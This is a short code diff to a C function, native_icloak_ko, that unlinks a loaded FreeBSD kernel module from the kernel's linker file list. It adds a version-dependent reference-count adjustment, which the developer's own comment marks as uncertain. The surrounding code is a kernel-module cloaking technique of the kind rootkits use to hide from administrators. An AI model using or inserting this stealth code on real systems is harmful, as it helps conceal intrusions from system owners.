@@ -27,7 +27,15 @@ int native_icloak_ko(const char *name) {
         TAILQ_REMOVE(&linker_files, kld, link);
         next_file_id--;
         deleted = 1;
+#if __FreeBSD__ > 6
+        // WARN(Rafael): I notice an increment by 2 in the reference counter,
+        //               but I am not sure if it also occurs in older versions.
+        if (linker_files.tqh_first->refs > 2) {
+            linker_files.tqh_first->refs -= 2;
+        }
+#else
         linker_files.tqh_first->refs--;
+#endif
         kld = NULL;
     }
 
